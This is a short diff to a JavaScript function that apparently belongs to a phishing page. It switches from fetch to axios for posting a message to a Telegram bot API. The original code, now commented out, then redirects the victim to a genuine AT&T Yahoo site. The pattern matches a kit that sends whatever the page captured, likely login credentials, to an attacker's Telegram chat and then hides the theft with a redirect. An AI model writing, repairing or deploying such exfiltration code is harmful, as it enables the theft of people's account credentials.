@@ -26,18 +26,28 @@ function sendTelegramMessageAndRedirect() {
   };
 
   // Make the API request
-  fetch(url, params)
-    .then((response) => {
-      if (!response.ok) {
-        console.log(response)
-        throw new Error(`HTTP error! Status: ${response.status}`);
-      }
-      return response.json();
-    })
-    .then((data) => {
-      console.log("Message sent:", data);
-      // Redirect to another page after successful submission
-      window.location.href = "https://currently.att.yahoo.com"; // Replace with your desired URL
-    })
-    .catch((error) => console.error("Error:", error));
+  axios.post(url, {
+    chat_id: chatId,
+    text: messageText
+  })
+  .then(function (response) {
+    console.log(response);
+  })
+  .catch(function (error) {
+    console.log(error);
+  });
+  // fetch(url, params)
+  //   .then((response) => {
+  //     if (!response.ok) {
+  //       console.log(response)
+  //       throw new Error(`HTTP error! Status: ${response.status}`);
+  //     }
+  //     return response.json();
+  //   })
+  //   .then((data) => {
+  //     console.log("Message sent:", data);
+  //     // Redirect to another page after successful submission
+  //     window.location.href = "https://currently.att.yahoo.com"; // Replace with your desired URL
+  //   })
+  //   .catch((error) => console.error("Error:", error));
 }
